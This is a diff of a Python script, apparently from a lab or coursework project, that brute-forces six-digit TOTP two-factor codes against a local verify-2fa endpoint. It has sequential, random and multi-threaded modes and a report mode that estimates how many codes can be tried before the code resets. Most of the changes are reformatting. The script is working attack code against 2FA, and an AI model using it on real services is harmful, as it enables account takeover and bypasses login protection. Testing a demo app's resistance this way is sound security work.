@@ -1,14 +1,14 @@
 """
 Description: This file has multiple brute force attacks where it attempts
 a 6-digit TOTP code to break the 2FA. It automatically stops after 30 seconds
-as that is the time the TOTP of Google Authenticator resets. 
+as that is the time the TOTP of Google Authenticator resets.
 Input arguments:
 1. user_id: int
 2. email: stri
 3. function to call: str
     - "simple" -> Iterate from 000000 to 9999999.
     - "random" -> try random 6-digit codes.
-    - "mp"     -> Use multiple threads with iteration. 
+    - "mp"     -> Use multiple threads with iteration.
     - "report" -> Generate information about the possibility to break the security.
 """
 
@@ -30,6 +30,8 @@ attempts_lock = threading.Lock()
 """
 General function to test if the try out code works.
 """
+
+
 def try_code_possibility(user_id, email, code):
     url = "http://localhost:5001/verify-2fa"
     payload = {"user_id": user_id, "email": email, "code": code}
@@ -46,9 +48,12 @@ def try_code_possibility(user_id, email, code):
         print(f"Attempted code: {code}, response: {response.status_code}")
         return 1
 
+
 """
 Function to iterate form 0 to 999999.
 """
+
+
 def brute_force_simple(user_id, email):
     start_time = time.time()
     attempts = 0
@@ -64,18 +69,27 @@ def brute_force_simple(user_id, email):
         end_time = time.time()
 
         if result == 0:
-            print(f"Brute-force attack completed in {end_time - start_time:.2f} seconds with {attempts} attempts.")
+            print(
+                f"Brute-force attack completed in {end_time - start_time:.2f} \
+                    seconds with {attempts} attempts."
+            )
             return 0
 
         # Check if the 30s has surpassed, if so exit.
         # Reason: TOTP resets every 30s.
         if end_time - start_time > LIFECYCLE_TOTP:
-            print(f"Brute-force attack stopped after {end_time-start_time:.2f} seconds with {attempts} attempts.")
+            print(
+                f"Brute-force attack stopped after {end_time-start_time:.2f} \
+                    seconds with {attempts} attempts."
+            )
             return 1
+
 
 """
 Function for each thread to execute
 """
+
+
 def thread_function(user_id, email, start, end):
     start_time = time.time()
     local_attempts = 0
@@ -95,9 +109,10 @@ def thread_function(user_id, email, start, end):
             with attempts_lock:
                 shared_attempts += local_attempts
 
-            print(f"Brute-force attack completed in {end_time - start_time:.2f} seconds.")
+            print(
+                f"Brute-force attack completed in {end_time - start_time:.2f} seconds."
+            )
             return 0
-            
 
         # Check if the 30s has surpassed, if so exit.
         # Reason: TOTP resets every 30s.
@@ -106,25 +121,29 @@ def thread_function(user_id, email, start, end):
             with attempts_lock:
                 shared_attempts += local_attempts
 
-            print(f"Brute-force attack stopped after {end_time-start_time:.2f} seconds.")
+            print(
+                f"Brute-force attack stopped after {end_time-start_time:.2f} seconds."
+            )
             return 1
 
 
 """
 Function that checks the numebr of available cores and tries using Mp
 """
-# Function to perform brute-force attack
-def brute_force_mp(user_id, email):
-    num_threads = os.cpu_count() # use one thread for 1 core, for simplicity
-    codes_per_thread = total_codes // num_threads
-    threads = []
 
+
+def brute_force_mp(user_id, email):
+    num_threads = os.cpu_count()  # use one thread for 1 core, for simplicity
+    codes_per_thread = MAX_POSSIBLE_CODES // num_threads
+    threads = []
 
     # Create and start threads
     for i in range(num_threads):
         start = i * codes_per_thread
         end = start + codes_per_thread if i < num_threads - 1 else MAX_POSSIBLE_CODES
-        thread = threading.Thread(target=thread_function, args=(user_id, email, start, end))
+        thread = threading.Thread(
+            target=thread_function, args=(user_id, email, start, end)
+        )
         threads.append(thread)
         thread.start()
 
@@ -133,12 +152,13 @@ def brute_force_mp(user_id, email):
         thread.join()
 
     print(f"Total number of {shared_attempts} attempts.")
-    
 
 
 """
 Brute Force using a single random  numbers (6 digits)
 """
+
+
 def brute_force_random(user_id, email):
     start_time = time.time()
     attempts = 0
@@ -146,7 +166,6 @@ def brute_force_random(user_id, email):
     while True:
         # Generate a random code (6 digits) with leading zeros
         code = f"{random.randint(0, 999999):06d}"
-        
 
         result = try_code_possibility(user_id, email, code)
         attempts += 1
@@ -154,18 +173,27 @@ def brute_force_random(user_id, email):
         end_time = time.time()
 
         if result == 0:
-            print(f"Brute-force attack completed in {end_time - start_time:.2f} seconds with {attempts} attempts.")
+            print(
+                f"Brute-force attack completed in {end_time - start_time:.2f} \
+                    seconds with {attempts} attempts."
+            )
             return 0
 
         # Check if the 30s has surpassed, if so exit.
         # Reason: TOTP resets every 30s.
         if end_time - start_time > LIFECYCLE_TOTP:
-            print(f"Brute-force attack stopped after {end_time-start_time:.2f} seconds  with {attempts} attempts.")
+            print(
+                f"Brute-force attack stopped after {end_time-start_time:.2f} \
+                    seconds with {attempts} attempts."
+            )
             return 1
+
 
 """
 Print statements to get information about brute force attack
 """
+
+
 def generate_report(user_id, email):
     attempts = 1000
     start_time = time.time()
@@ -173,12 +201,15 @@ def generate_report(user_id, email):
         code = f"{code_num:06d}"
         try_code_possibility(user_id, email, code)
     end_time = time.time()
-    time_of_single_attempt = (end_time - start_time)/ attempts
+    time_of_single_attempt = (end_time - start_time) / attempts
     number_of_attempts_possible = LIFECYCLE_TOTP // time_of_single_attempt
     percentage_code_tried = (number_of_attempts_possible / MAX_POSSIBLE_CODES) * 100
-    print(f"\n\nTheoretical Brute-force attack report:")
+    print("\n\nTheoretical Brute-force attack report:")
     print(f"Single attempt cost: {time_of_single_attempt} seconds.")
-    print(f"Maximum number of tries before the TOTP resets: {number_of_attempts_possible} attempts")
+    print(
+        f"Maximum number of tries before the TOTP resets: \
+            {number_of_attempts_possible} attempts"
+    )
     print(f"Possible codes tried before TOTP resets: {percentage_code_tried} %")
 
 
@@ -189,7 +220,9 @@ if __name__ == "__main__":
 
     parser.add_argument("user_id", type=int)
     parser.add_argument("email", type=str)
-    parser.add_argument("method", type=str, choices=["simple", "random", "mp", "report"])
+    parser.add_argument(
+        "method", type=str, choices=["simple", "random", "mp", "report"]
+    )
     inputargs = parser.parse_args()
 
     # Call the brute-force function with input arguments
@@ -197,7 +230,7 @@ if __name__ == "__main__":
         "simple": brute_force_simple,
         "random": brute_force_random,
         "mp": brute_force_mp,
-        "report": generate_report
+        "report": generate_report,
     }
 
     fn_switch[inputargs.method](inputargs.user_id, inputargs.email)
